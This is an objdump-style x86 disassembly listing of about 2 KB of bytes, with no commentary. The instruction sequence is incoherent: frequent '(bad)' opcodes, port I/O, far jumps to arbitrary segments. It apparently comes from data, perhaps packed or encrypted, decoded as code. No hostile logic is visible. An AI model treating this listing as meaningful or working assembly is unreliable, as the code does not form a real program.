  402185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402186:	imul   edx,DWORD PTR [eax+0x62962187],0xfffffffd
  40218d:	jge    0x4021be
  40218f:	dec    ecx
  402190:	sub    eax,0xd305d222
  402195:	lahf   
  402196:	rcr    edi,0xef
  402199:	mov    edx,0xf3653b8b
  40219e:	aad    0x49
  4021a0:	in     al,0x87
  4021a2:	and    edx,DWORD PTR [eax-0x13]
  4021a5:	loope  0x4021f1
  4021a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021a8:	stos   BYTE PTR es:[edi],al
  4021a9:	push   edx
  4021aa:	mov    al,ds:0xe6273dca
  4021af:	jns    0x402179
  4021b1:	xrelease xchg BYTE PTR [ebp+0x49],al
  4021b5:	push   edx
  4021b6:	test   BYTE PTR [eax+0xa],bl
  4021b9:	jmp    0x6e2b5995
  4021be:	sbb    BYTE PTR [eax-0x27],cl
  4021c1:	test   BYTE PTR [eax],al
  4021c3:	fs jle 0x4021ee
  4021c6:	push   ecx
  4021c7:	xor    DWORD PTR [ecx],esi
  4021c9:	pop    es
  4021ca:	sub    DWORD PTR [eax+0x23db5656],esp
  4021d0:	aaa    
  4021d1:	push   edi
  4021d2:	or     ch,al
  4021d4:	dec    edi
  4021d5:	or     eax,0x537a8803
  4021da:	into   
  4021db:	bound  eax,QWORD PTR [esi]
  4021dd:	fisubr WORD PTR [edi]
  4021df:	aaa    
  4021e0:	dec    edx
  4021e1:	adc    al,0xef
  4021e3:	add    BYTE PTR [ecx+0x527d3b02],ch
  4021e9:	xor    cl,0xb1
  4021ec:	fisubr DWORD PTR [eax+0x6d46d11a]
  4021f2:	lahf   
  4021f3:	popf   
  4021f4:	aaa    
  4021f5:	and    dl,BYTE PTR ds:0xbd456601
  4021fb:	jl     0x4021d1
  4021fd:	mov    dl,BYTE PTR [edx-0x74]
  402200:	adc    eax,0xe756037c
  402205:	aam    0x3c
  402207:	test   DWORD PTR [edi-0x5271022],esp
  40220d:	iret   
  40220e:	data16 ins BYTE PTR es:[edi],dx
  402210:	push   esi
  402211:	pop    edi
  402212:	adc    eax,0xe4cc5d
  402217:	gs add al,0x12
  40221a:	mov    edi,0xc82e50a
  40221f:	fxch   st(4)
  402221:	lea    ebp,[ebx]
  402223:	test   al,0xb5
  402225:	push   edi
  402226:	sbb    DWORD PTR [edi+0x22],ebx
  402229:	nop
  40222a:	das    
  40222b:	mov    esp,esp
  40222d:	jns    0x402296
  40222f:	push   ecx
  402230:	ja     0x4021f3
  402232:	(bad)  
  402233:	out    0x5b,al
  402235:	scas   al,BYTE PTR es:[edi]
  402236:	pushf  
  402237:	pop    ds
  402238:	or     BYTE PTR [ebx-0x5fa9bb23],0xb1
  40223f:	stos   BYTE PTR es:[edi],al
  402240:	es adc al,0xa5
  402243:	test   esi,ebp
  402245:	arpl   di,dx
  402247:	pop    ebp
  402248:	dec    ecx
  402249:	lea    ecx,[esi-0x55]
  40224c:	inc    esi
  40224d:	mov    bl,0x80
  40224f:	mov    DWORD PTR [bp+si-0x1b57],edi
  402254:	jno    0x4022c7
  402256:	push   esi
  402257:	adc    BYTE PTR [ecx+0x12efe2cc],ch
  40225d:	dec    edx
  40225e:	xlat   BYTE PTR ds:[ebx]
  40225f:	add    BYTE PTR [ecx+0xd],bh
  402262:	xor    al,0x7d
  402264:	and    bh,BYTE PTR ds:0x487ef10f
  40226a:	les    ebp,FWORD PTR [edi*8-0x736ccd2a]
  402271:	sbb    edi,DWORD PTR [esi]
  402273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402274:	retf   
  402275:	popa   
  402276:	pop    es
  402277:	jmp    0x1553:0x23751606
  40227e:	dec    esp
  40227f:	adc    ebx,ebp
  402281:	into   
  402282:	push   ecx
  402283:	jo     0x4022fa
  402285:	call   0x3ff1:0x91d82026
  40228c:	mov    ds:0x2c00abe2,al
  402291:	cmp    edi,DWORD PTR gs:[ecx+ecx*8]
  402295:	jno    0x402277
  402297:	mov    cl,0x8e
  402299:	jecxz  0x40225d
  40229b:	xchg   ecx,eax
  40229c:	stos   BYTE PTR es:[edi],al
  40229d:	in     al,0x1a
  40229f:	cdq    
  4022a0:	jp     0x40223a
  4022a2:	inc    esi
  4022a3:	pop    eax
  4022a4:	ret    0x639f
  4022a7:	jecxz  0x4022fe
  4022a9:	and    ecx,DWORD PTR [edi-0x413fefb4]
  4022af:	jns    0x402325
  4022b1:	stos   BYTE PTR es:[edi],al
  4022b2:	clc    
  4022b3:	dec    di
  4022b5:	fcmovbe st,st(7)
  4022b7:	rcr    DWORD PTR [edi+0x37],0xb
  4022bb:	push   eax
  4022bc:	(bad)
  4022c0:	pop    es
  4022c1:	retf   0x6605
  4022c4:	neg    DWORD PTR [esi-0x460d59b]
  4022ca:	out    dx,al
  4022cb:	out    dx,al
  4022cc:	retf   0x29da
  4022cf:	adc    eax,0x9dd3a7fd
  4022d4:	dec    eax
  4022d5:	push   0x9be0015a
  4022da:	fcomp  QWORD PTR [ebx+0x1e]
  4022dd:	out    dx,al
  4022de:	test   al,0x62
  4022e0:	push   ss
  4022e1:	cmp    dl,BYTE PTR [edi]
  4022e3:	add    ch,bl
  4022e5:	sub    al,0xee
  4022e7:	xor    al,0x37
  4022e9:	pop    es
  4022ea:	in     eax,0x9f
  4022ec:	stos   BYTE PTR es:[edi],al
  4022ed:	fwait
  4022ee:	cdq    
  4022ef:	jecxz  0x402288
  4022f1:	dec    edi
  4022f2:	push   ebx
  4022f3:	adc    al,0xe3
  4022f5:	fwait
  4022f6:	fs cs push esp
  4022f9:	pop    es
  4022fa:	sbb    al,0x21
  4022fc:	mov    dl,0x55
  4022fe:	div    ecx
  402300:	push   edx
  402301:	push   ds
  402302:	sar    DWORD PTR [eax+0x5ca6e65b],1
  402308:	test   BYTE PTR [esi],al
  40230a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40230c:	std    
  40230d:	dec    edi
  40230e:	add    eax,0x441078a9
  402313:	(bad)  
  402314:	lahf   
  402315:	mov    eax,ds:0xb33e647f
  40231a:	into   
  40231b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40231c:	inc    edi
  40231d:	and    BYTE PTR [edi+edi*4+0x2a14271c],cl
  402324:	adc    DWORD PTR [edx+0x2b477240],ebx
  40232a:	push   cs
  40232b:	(bad)  
  40232d:	ficom  WORD PTR [ecx-0x55758152]
  402333:	xor    BYTE PTR [ebx+0x3493ccb4],ch
  402339:	mov    ebx,0x80a45c86
  40233e:	inc    esp
  40233f:	dec    eax
  402340:	lods   al,BYTE PTR ds:[esi]
  402341:	jo     0x40230c
  402343:	ss push edi
  402345:	stos   BYTE PTR es:[edi],al
  402346:	xchg   ebx,eax
  402347:	aam    0xe4
  402349:	mov    ebx,0x1b595565
  40234e:	sub    DWORD PTR [esi+0xd],edx
  402351:	xor    BYTE PTR [ecx+eax*2],ch
  402354:	xchg   DWORD PTR [edi],esi
  402356:	xor    eax,0xa34b589b
  40235b:	(bad)  
  40235c:	xor    al,0x26
  40235e:	(bad)  
  40235f:	sbb    eax,0x4a1ce00d
  402364:	xchg   ebx,eax
  402365:	xchg   esp,eax
  402366:	xchg   ebx,eax
  402367:	popa   
  402368:	push   ebx
  402369:	jnp    0x402320
  40236b:	pop    edi
  40236c:	sbb    eax,0x25f24b86
  402371:	fst    st(0)
  402373:	sub    ebx,DWORD PTR [ecx+0x2]
  402376:	pop    eax
  402377:	jge    0x402340
  402379:	adc    DWORD PTR [edi],ebx
  40237b:	in     eax,0xe4
  40237d:	push   esi
  40237e:	jecxz  0x40236d
  402380:	data16 in al,0x59
  402383:	sti    
  402384:	outs   dx,DWORD PTR ds:[esi]
  402385:	jmp    0x1407:0xa962a00c
  40238c:	and    eax,0xbf975e52
  402391:	mov    ds:0x6af499c9,al
  402396:	sub    ecx,ecx
  402398:	aam    0x21
  40239a:	imul   ebx,ebx,0x999ef469
  4023a0:	out    0x62,al
  4023a2:	shr    BYTE PTR [ecx],0x73
  4023a5:	dec    edi
  4023a6:	adc    al,0x41
  4023a8:	jae    0x402366
  4023aa:	nop
  4023ab:	jbe    0x40239e
  4023ad:	xor    ah,dl
  4023af:	jne    0x40242c
  4023b1:	cmc    
  4023b2:	int    0x40
  4023b4:	out    dx,al
  4023b5:	(bad)  
  4023b6:	mov    ds:0x13fa301f,eax
  4023bb:	cmp    DWORD PTR [ecx],edi
  4023bd:	push   eax
  4023be:	sar    BYTE PTR [edi-0x44c32b5c],cl
  4023c4:	test   al,0xde
  4023c6:	dec    ecx
  4023c7:	pop    esi
  4023c8:	or     DWORD PTR [ebx+0x7f],0x6a3b3a77
  4023cf:	imul   bl
  4023d1:	loop   0x4023be
  4023d3:	dec    edx
  4023d4:	(bad)  
  4023d5:	fcmovnbe st,st(5)
  4023d7:	out    dx,eax
  4023d8:	mov    al,0x94
  4023da:	cs pop esp
  4023dc:	fmul   st(0),st
  4023de:	adc    BYTE PTR [edi],0xfd
  4023e1:	dec    dh
  4023e3:	mov    eax,ds:0xd323efd3
  4023e8:	add    DWORD PTR [ecx+ebx*4+0x7eddfc97],0x9e6247b4
  4023f3:	ret    0x8569
  4023f6:	sti    
  4023f7:	das    
  4023f8:	int    0xdc
  4023fa:	popf   
  4023fb:	inc    edx
  4023fc:	jle    0x402389
  4023fe:	mov    al,ds:0xe4ef474e
  402403:	retf   0x5b76
  402406:	icebp  
  402407:	jge    0x4023d1
  402409:	mov    BYTE PTR [ebp-0x7b],cl
  40240c:	add    esi,eax
  40240e:	stc    
  40240f:	leave  
  402410:	add    al,ch
  402412:	sar    edi,1
  402414:	pusha  
  402415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402416:	jg     0x402403
  402418:	into   
  402419:	cmp    DWORD PTR [edi+ebx*4+0x62],eax
  40241d:	sub    dh,BYTE PTR [ecx+0x62]
  402420:	mov    esp,0x66489e66
  402425:	clc    
  402426:	mov    cs,WORD PTR [esi]
  402428:	test   BYTE PTR [ebp-0x63f5df55],bh
  40242e:	fldcw  WORD PTR [esi-0x1aeea3]
  402434:	inc    ebp
  402435:	stos   BYTE PTR es:[edi],al
  402436:	psrlq  mm6,QWORD PTR [ebx-0x27]
  40243a:	push   ss
  40243b:	mov    ah,0x1a
  40243d:	cmp    DWORD PTR [edi],ebx
  40243f:	into   
  402440:	stos   DWORD PTR es:[edi],eax
  402441:	sub    dl,cl
  402443:	outs   dx,BYTE PTR ds:[esi]
  402444:	mov    WORD PTR [ebx],cs
  402446:	fxch   st(6)
  402448:	(bad)
  40244b:	mov    bh,0x54
  40244d:	pop    esi
  40244e:	sbb    BYTE PTR [esp+eax*8-0x1f485842],ah
  402455:	add    al,0xbd
  402457:	inc    ebx
  402458:	and    al,0xcc
  40245a:	psubusb mm2,QWORD PTR [edi]
  40245d:	adc    al,0x34
  40245f:	clc    
  402460:	dec    edx
  402461:	sub    eax,0x5cebee3
  402466:	or     BYTE PTR ds:0x9403bfc0,dl
  40246c:	or     al,0x5d
  40246e:	dec    edi
  40246f:	iret   
  402470:	sub    BYTE PTR [edx],al
  402472:	adc    eax,0x8ad839d4
  402477:	fadd   DWORD PTR [edi+0x7ebfb9fd]
  40247d:	psadbw mm5,mm1
  402480:	pop    es
  402481:	repz pop esp
  402483:	ficomp WORD PTR [ebx+0x51ab718b]
  402489:	mov    ds:0x7fd57d97,eax
  40248e:	adc    al,0xba
  402490:	jmp    0x4024dc
  402492:	fmul   DWORD PTR [ebx-0x32]
  402495:	test   DWORD PTR [edi],esp
  402497:	push   ebp
  402498:	aas    
  402499:	and    eax,0x53faa229
  40249e:	pop    ecx
  40249f:	loope  0x402427
  4024a1:	sbb    ch,dl
  4024a3:	imul   esp,DWORD PTR [edx+0x3b],0xffffffd6
  4024a7:	or     bh,dl
  4024a9:	push   ecx
  4024aa:	add    al,0x99
  4024ac:	in     al,0x16
  4024ae:	jge    0x40249d
  4024b0:	jno    0x402502
  4024b2:	or     ecx,DWORD PTR [esi+0x43567b6a]
  4024b8:	data16 sub al,0x10
  4024bb:	stos   BYTE PTR es:[edi],al
  4024bc:	jno    0x402532
  4024be:	jmp    0x4024a9
  4024c0:	mov    bh,0x62
  4024c2:	sub    ebp,DWORD PTR [ecx+0x1e21152f]
  4024c8:	call   0x6f7e:0x2b09f5e2
  4024cf:	pop    ss
  4024d0:	mov    ch,0xde
  4024d2:	aaa    
  4024d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d4:	cmp    bh,dh
  4024d6:	int    0xe9
  4024d8:	mov    cl,0xaf
  4024da:	xor    dh,BYTE PTR [eax-0x6d24df00]
  4024e0:	xor    al,0x6f
  4024e2:	push   ds
  4024e3:	arpl   WORD PTR [ebp-0x64d7b9d9],si
  4024e9:	imul   eax,edi,0x3a
  4024ec:	out    0x29,al
  4024ee:	popa   
  4024ef:	loopne 0x4024e5
  4024f1:	rcl    DWORD PTR [esi-0x47],0x5d
  4024f5:	cmp    DWORD PTR [ecx+ebx*4+0x62e3c9b8],ecx
  4024fc:	pop    esp
  4024fd:	inc    ebx
  4024fe:	retf   0xf643
  402501:	push   ecx
  402502:	jnp    0x402530
  402504:	je     0x4024ec
  402506:	ss pushf 
  402508:	mov    edi,edi
  40250a:	stos   DWORD PTR es:[edi],eax
  40250b:	ret    0xf6e6
  40250e:	mov    eax,0x1f4eb9ef
  402513:	jb     0x40254b
  402515:	aad    0xdc
  402517:	dec    ecx
  402518:	mov    edi,0x979d1641
  40251d:	sbb    esp,esi
  40251f:	ret    0xa487
  402522:	stos   DWORD PTR es:[edi],eax
  402523:	push   ecx
  402524:	mov    esi,0x4a7c2d14
  402529:	popf   
  40252a:	rcr    esp,cl
  40252c:	fldenv [edx-0x5d21e322]
  402532:	icebp  
  402533:	(bad)  
  402534:	mov    ecx,0x3b44bad9
  402539:	push   ecx
  40253a:	fsub   DWORD PTR [ecx-0x77e63cb2]
  402540:	cwde   
  402541:	dec    esp
  402542:	shl    DWORD PTR [eax+esi*8-0x4a],0x82
  402547:	and    al,0x2a
  402549:	out    dx,eax
  40254a:	(bad)  
  40254b:	push   edi
  40254c:	jmp    0x402589
  40254e:	stc    
  40254f:	mul    BYTE PTR [ecx+0x67]
  402552:	hlt    
  402553:	in     eax,dx
  402554:	xchg   ecx,edi
  402556:	ret    0x9187
  402559:	inc    edi
  40255a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40255b:	dec    edx
  40255c:	mov    esi,0xdcb18e2f
  402561:	outs   dx,DWORD PTR ds:[esi]
  402562:	test   al,0x36
  402564:	idiv   DWORD PTR [esi]
  402566:	pop    fs
  402568:	add    eax,0x7d466fd2
  40256d:	sbb    BYTE PTR [ecx-0x6b8f339a],dh
  402573:	pusha  
  402574:	jne    0x40251d
  402576:	mov    al,0xf6
  402578:	fdiv   QWORD PTR [ebp-0x65]
  40257b:	int    0x42
  40257d:	shl    ebp,1
  40257f:	pop    es
  402580:	and    eax,0x5eec8a6f
  402585:	(bad)  
  402586:	mov    bh,0x33
  402588:	enter  0x8ec1,0xbe
  40258c:	retf   0x5955
  40258f:	repnz test DWORD PTR [eax],edx
  402592:	out    dx,al
  402593:	inc    edx
  402594:	iret   
  402595:	xor    eax,0xcf89b8cb
  40259a:	mov    ah,0x15
  40259c:	jge    0x40257e
  40259e:	adc    eax,0x2550257c
  4025a3:	neg    DWORD PTR [esi]
  4025a5:	dec    ebx
  4025a6:	sahf   
  4025a7:	add    eax,0xe4d33c6b
  4025ac:	test   DWORD PTR [ecx-0x6c],0xd4ca0e51
  4025b3:	and    al,0xef
  4025b5:	ss and al,0x90
  4025b8:	jae    0x4025a6
  4025ba:	mov    ah,0xf2
  4025bc:	call   0xa0e9:0xcd66c289
  4025c3:	popf   
  4025c4:	cs cmp eax,0x2b482565
  4025ca:	fcomp  DWORD PTR [ecx+0xcef1f3d]
  4025d0:	pop    edi
  4025d1:	stos   DWORD PTR es:[edi],eax
  4025d2:	outs   dx,DWORD PTR ds:[esi]
  4025d3:	mov    bl,0x5
  4025d5:	push   ss
  4025d6:	fdivr  DWORD PTR [ecx-0x49a73a63]
  4025dc:	jmp    0x4025fa
  4025de:	cmp    DWORD PTR [edx],esi
  4025e0:	ret    
  4025e1:	sub    DWORD PTR [eax+0x3393c73b],0x35699484
  4025eb:	xchg   edx,eax
  4025ec:	sbb    cl,BYTE PTR [ecx-0x44e36299]
  4025f2:	push   ds
  4025f3:	loopne 0x402603
  4025f5:	or     eax,0x1df11d51
  4025fa:	xor    esi,DWORD PTR [ebx-0x75ad40c0]
  402600:	test   BYTE PTR [ebp+0x6295679d],al
  402606:	mov    eax,ds:0xe29cbfc3
  40260b:	inc    esp
  40260c:	in     eax,dx
  40260d:	xor    ch,al
  40260f:	pop    es
  402610:	int    0xfa
  402612:	xchg   esp,esp
  402614:	fidivr WORD PTR [edi-0x13]
  402617:	xchg   ebp,eax
  402618:	cmp    DWORD PTR [eax+0x1],esi
  40261b:	or     eax,0x9cd3b127
  402620:	xor    BYTE PTR [ebx-0x32f03aef],cl
  402626:	loope  0x40263e
  402628:	bound  esi,QWORD PTR ss:[edx]
  40262b:	push   edx
  40262c:	enter  0xfb4c,0x7f
  402630:	ror    DWORD PTR [ebx],1
  402632:	inc    edx
  402633:	(bad)  
  402634:	(bad)  
  402635:	sar    BYTE PTR [ebx],cl
  402637:	jle    0x402633
  402639:	mov    eax,0xa353138b
  40263e:	(bad)  
  40263f:	lds    edi,FWORD PTR es:[ebx+0x78]
  402643:	mov    esp,0xc2de7806
  402648:	ins    BYTE PTR es:[edi],dx
  402649:	out    dx,eax
  40264a:	push   ss
  40264b:	add    eax,0x843b0c29
  402650:	clc    
  402651:	lock lds edi,FWORD PTR ds:0xe5dfab2e
  402658:	cmp    al,0x12
  40265a:	dec    ebx
  40265b:	xchg   ebp,eax
  40265c:	mov    edi,0xa4523b6d
  402661:	imul   esp,ebp,0x90eae508
  402667:	jmp    0xbb3836c4
  40266c:	cmp    al,0x9a
  40266e:	pop    esi
  40266f:	xor    al,0x77
  402671:	push   edx
  402672:	xchg   edx,eax
  402673:	loopne 0x4026ae
  402675:	push   ecx
  402676:	sbb    eax,0xcf501a6d
  40267b:	cmp    dh,ch
  40267d:	aas    
  40267e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40267f:	mov    bh,0xc
  402681:	lea    ebp,[ebx-0x54]
  402684:	rep ins BYTE PTR es:[edi],dx
  402686:	sbb    bh,BYTE PTR [edi-0x5f96b80e]
  40268c:	push   cs
  40268d:	pop    esi
  40268e:	or     eax,0x14b64cac
  402693:	aaa    
  402694:	out    dx,eax
  402695:	les    edx,FWORD PTR [edi+0x55]
  402698:	inc    esp
  402699:	bound  edi,QWORD PTR [ebx+0x4b]
  40269c:	cli    
  40269d:	mov    cl,0xba
  40269f:	push   ebx
  4026a0:	clc    
  4026a1:	add    DWORD PTR [esi],ebx
  4026a3:	fwait
  4026a4:	sti    
  4026a5:	xchg   esi,eax
  4026a6:	cld    
  4026a7:	push   edi
  4026a8:	push   ebp
  4026a9:	fstp   QWORD PTR [ecx]
  4026ab:	mov    ds:0x7f09ffd6,al
  4026b0:	cmp    BYTE PTR [esi+0x2850aef2],dl
  4026b6:	lods   eax,DWORD PTR ds:[esi]
  4026b7:	retf   0x68e4
  4026ba:	mov    ebp,0x4b6bd96
  4026bf:	pop    ebp
  4026c0:	clc    
  4026c1:	push   es
  4026c2:	nop
  4026c3:	popf   
  4026c4:	mov    al,0x88
  4026c6:	mov    ds:0xb82dfed4,eax
  4026cb:	fiadd  DWORD PTR [esi-0x45]
  4026ce:	cmc    
  4026cf:	sbb    dl,BYTE PTR [esi-0x7]
  4026d2:	sub    ch,BYTE PTR [ebp-0x53]
  4026d5:	fcomp  DWORD PTR ds:0xaf451f62
  4026db:	fild   QWORD PTR [eax+ecx*4]
  4026de:	fisubr DWORD PTR [esi+0x3d14cb36]
  4026e4:	(bad)  
  4026e5:	ins    DWORD PTR es:[edi],dx
  4026e6:	inc    eax
  4026e7:	idiv   DWORD PTR [ebx-0x65]
  4026ea:	lock sub DWORD PTR [eax],esi
  4026ed:	jne    0x402674
  4026ef:	push   ecx
  4026f0:	push   ds
  4026f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026f2:	cs jle 0x402690
  4026f5:	inc    ebp
  4026f6:	cmc    
  4026f7:	xor    dh,ch
  4026f9:	out    0x81,al
  4026fb:	rep stos DWORD PTR es:[edi],eax
  4026fd:	push   0x8322dff1
  402702:	sbb    BYTE PTR [eax-0x42],al
  402705:	popa   
  402706:	addr16 pop eax
  402708:	dec    edx
  402709:	outs   dx,DWORD PTR ds:[esi]
  40270a:	arpl   WORD PTR [ebx],bx
  40270c:	pop    edx
  40270d:	setl   BYTE PTR [ebx+ecx*8]
  402711:	pop    ebp
  402712:	mov    esp,0x73ed844d
  402717:	add    al,BYTE PTR [eax]
  402719:	fcomip st,st(3)
  40271b:	scas   eax,DWORD PTR es:[edi]
  40271c:	test   eax,0xba9c6239
  402721:	cwde   
  402722:	adc    cl,BYTE PTR [eiz*1+0x39d4f334]
  402729:	jl     0x4026cd
  40272b:	dec    esp
  40272c:	cdq    
  40272d:	cmp    DWORD PTR [ebx+edi*4],ecx
  402730:	hlt    
  402731:	out    dx,al
  402732:	ror    DWORD PTR [ebp-0xa5cdd74],1
  402738:	fmul   DWORD PTR [edi+0x69ee1333]
  40273e:	mov    DWORD PTR [edi+0x37568797],edx
  402744:	sub    ch,bh
  402746:	nop
  402747:	(bad)  
  402748:	arpl   WORD PTR [edi+0x35df7cb2],bx
  40274e:	inc    edx
  40274f:	ins    BYTE PTR es:[edi],dx
  402750:	fstp   QWORD PTR [ebp+0x8]
  402753:	xchg   esp,eax
  402754:	mov    eax,0x98596325
  402759:	pop    DWORD PTR [ebx+0x5932ecf4]
  40275f:	loop   0x40271c
  402761:	es ins BYTE PTR es:[edi],dx
  402763:	dec    edi
  402764:	fsub   QWORD PTR [eax+0x2754637f]
  40276a:	mov    DWORD PTR [edi+edx*2+0x1dd4e28f],ecx
  402771:	jne    0x4027d0
  402773:	push   ss
  402774:	ins    DWORD PTR es:[edi],dx
  402775:	jl     0x402700
  402777:	xor    eax,0x2c8d49e5
  40277c:	fs lahf 
  40277e:	fidiv  DWORD PTR [ebx-0x2b946658]
  402784:	rcr    DWORD PTR [edi],cl
  402786:	(bad)  
  402787:	adc    edx,DWORD PTR [esi-0x303fc609]
  40278d:	lahf   
  40278e:	imul   esi,DWORD PTR [ecx],0x4d
  402791:	jns    0x402776
  402793:	mov    BYTE PTR [edi-0x39],ch
  402796:	sbb    eax,0xadc707da
  40279b:	mov    BYTE PTR [ecx-0x46],bl
  40279e:	inc    esi
  40279f:	jnp    0x402817
  4027a1:	fild   QWORD PTR [edx+eax*8]
  4027a4:	mov    ecx,0xe6cd6570
  4027a9:	(bad)  
  4027ab:	fwait
  4027ac:	ret    
  4027ad:	fimul  WORD PTR [edx]
  4027af:	cmp    BYTE PTR [ecx+0x1b],dh
  4027b2:	(bad)  [ebx]
  4027b4:	sbb    ebx,esp
  4027b6:	cli    
  4027b7:	mov    WORD PTR [edi+0x5a1bb879],es
  4027bd:	scas   al,BYTE PTR es:[edi]
  4027be:	std    
  4027bf:	in     eax,0xa8
  4027c1:	aaa    
  4027c2:	out    0x72,eax
  4027c4:	xor    esi,esi
  4027c6:	fdiv   st,st(6)
  4027c8:	ds sbb al,0xee
  4027cb:	fsincos 
  4027cd:	dec    edi
  4027ce:	out    dx,al
  4027cf:	popa   
  4027d0:	mov    BYTE PTR [ecx-0x33],bh
  4027d3:	scas   al,BYTE PTR es:[edi]
  4027d4:	ja     0x4027a6
  4027d6:	sar    BYTE PTR [esi+0x67ab47b9],0x19
  4027dd:	ficomp WORD PTR [ebx+0x5cbfb927]
  4027e3:	sbb    al,0xae
  4027e5:	inc    ebp
  4027e6:	shr    DWORD PTR [edi-0x6e],1
  4027e9:	not    DWORD PTR [eax+0x72]
  4027ec:	inc    eax
  4027ed:	mov    fs,edi
  4027ef:	mov    ds:0x1fb058c1,eax
  4027f4:	xchg   ebx,eax
  4027f5:	in     eax,dx
  4027f6:	fstp   TBYTE PTR [edx+0x6c0ae83f]
  4027fc:	clc    
  4027fd:	(bad)  
  4027fe:	jmp    0x4027b5
  402800:	add    al,0xc3
  402802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402803:	stos   DWORD PTR es:[edi],eax
  402804:	sti    
  402805:	mov    cl,0x34
  402807:	popa   
  402808:	sub    esi,DWORD PTR [edi]
  40280a:	jmp    0xae3a9d3b
  40280f:	mov    WORD PTR [eax-0x1f305f71],ss
  402815:	aaa    
  402816:	sti    
  402817:	pop    eax
  402818:	scas   al,BYTE PTR es:[edi]
  402819:	mov    edi,0x44993bc7
  40281e:	sub    BYTE PTR [edx],ah
  402820:	pushf  
  402821:	sbb    dl,cl
  402823:	mov    ah,0xdb
  402825:	lods   eax,DWORD PTR ds:[esi]
  402826:	and    eax,0x37eeabd4
  40282b:	push   esp
  40282c:	retf   
  40282d:	mov    ch,0x81
  40282f:	das    
  402830:	test   ebx,0x6ca2425f
  402836:	mov    al,ds:0x7b80ef3b
  40283b:	push   0x928b51f7
  402840:	cmp    esp,DWORD PTR [ebp+0x14]
  402843:	and    BYTE PTR [ebx-0x5452b5b4],ch
  402849:	sub    BYTE PTR [ebp+0x3ed55015],dh
  40284f:	not    DWORD PTR [eax-0x1ca5ba77]
  402855:	push   cs
  402856:	mov    ch,0xa2
  402858:	outs   dx,DWORD PTR ds:[esi]
  402859:	mov    edi,0x96b6f0e9
  40285e:	mov    cl,0x40
  402860:	call   0x5a04:0x281cb1d0
  402867:	pop    esi
  402868:	mov    ?,WORD PTR [ecx-0x22423e42]
  40286e:	rcr    dl,1
  402870:	(bad)  
  402871:	jecxz  0x4028e2
  402873:	inc    edi
  402874:	imul   edx,DWORD PTR [ebx-0x5c],0x1b
  402878:	cmp    al,0xec
  40287a:	sbb    eax,0x28f2593e
  40287f:	or     al,0xca
  402881:	or     eax,0x534ea0c9
  402886:	repz fisub DWORD PTR ds:[ecx+0x25]
  40288b:	pop    esp
  40288c:	push   esp
  40288d:	arpl   WORD PTR [edx+0x19],bx
  402890:	push   ds
  402891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402892:	(bad)  
  402893:	mov    bh,ch
  402895:	jns    0x4028ac
  402897:	cmp    DWORD PTR [ebp-0x71],0x7fc1d559
  40289e:	add    esp,DWORD PTR [esi+0x2adec5a5]
  4028a4:	jnp    0x4028db
  4028a6:	inc    esp
  4028a7:	adc    eax,0xb5c9bf42
  4028ac:	inc    ebp
  4028ad:	adc    eax,0x317e3a5f
  4028b2:	xchg   edi,eax
  4028b3:	cmp    eax,0xf39c7fa8
  4028b8:	or     ebx,DWORD PTR [esi-0xa2f646d]
  4028be:	mov    esi,0xcdbfb792
  4028c3:	add    esp,DWORD PTR ds:0xa8073e7c
  4028c9:	ja     0x402854
  4028cb:	pop    esi
  4028cc:	arpl   WORD PTR [edx+eax*2+0x2ab3cdb7],ax
  4028d3:	push   edx
  4028d4:	jle    0x40287f
  4028d6:	fsub   DWORD PTR [edx-0x11]
  4028d9:	ins    BYTE PTR es:[edi],dx
  4028da:	in     al,dx
  4028db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028dc:	adc    al,0xe2
  4028de:	les    edi,FWORD PTR [esi-0x791d7f3b]
  4028e4:	enter  0x1d6b,0x4a
  4028e8:	je     0x4028e6
  4028ea:	jecxz  0x402871
  4028ec:	adc    DWORD PTR [esi+0x56],ecx
  4028ef:	add    DWORD PTR [esi+0x8cd9823],ecx
  4028f5:	call   0xd41efc5d
  4028fa:	add    eax,0xe6146225
  4028ff:	dec    edi
  402900:	lea    edi,[eax]
  402902:	icebp  
  402903:	mov    dl,0x4d
  402905:	pop    ebp
  402906:	pushf  
  402907:	or     esp,DWORD PTR ds:0x4f5db398
  40290d:	call   0xc94b:0x6a399283
  402914:	rcr    BYTE PTR ds:0x35ecfaa2,1
  40291a:	cwde   
  40291b:	cli    
  40291c:	fnstsw WORD PTR [eax+0x77]
  40291f:	stc    
  402920:	adc    BYTE PTR [edi],al
  402922:	adc    eax,0x6c2589f0
  402927:	scas   al,BYTE PTR es:[edi]
  402928:	mov    edx,0x98d550f2
  40292d:	xor    edx,DWORD PTR [ebp-0x9]
  402930:	pop    edi
  402931:	call   0x5f22d820
  402936:	jae    0x402955
  402938:	jo     0x4029b7
  40293a:	pop    esp
  40293b:	jge    0x4028fc
  40293d:	(bad)  
  40293e:	in     al,0x86
  402940:	div    DWORD PTR [edx]
  402942:	jbe    0x4029ac
  402944:	std    
  402945:	xchg   dh,ch
  402947:	popf   
  402948:	and    BYTE PTR [eax+0x31],bl
  40294b:	add    eax,0x66e38a84
  402950:	add    BYTE PTR [ebx],ah
  402952:	cmp    BYTE PTR [eax],ah
  402954:	in     al,dx
  402955:	push   eax
  402956:	jg     0x4028db
  402958:	into   
  402959:	dec    eax
  40295a:	fwait
  40295b:	ss sbb al,0xb7
  40295e:	fild   WORD PTR [ebp+0x63876be6]
  402964:	mov    al,ds:0xa22de073
  402969:	scas   eax,DWORD PTR es:[edi]
  40296a:	fcomp  DWORD PTR [eax+ebp*4]
  40296d:	and    cl,dh
  40296f:	std    
  402970:	scas   eax,DWORD PTR es:[edi]
  402971:	cwde   
  402972:	push   es
  402973:	add    BYTE PTR [ebp+0x3daafad3],ah
  402979:	cli    
  40297a:	sub    al,0x90
  40297c:	mov    al,ds:0x952e8dce
  402981:	push   ss
  402982:	pop    edi
  402983:	inc    esp
  402984:	(bad)  
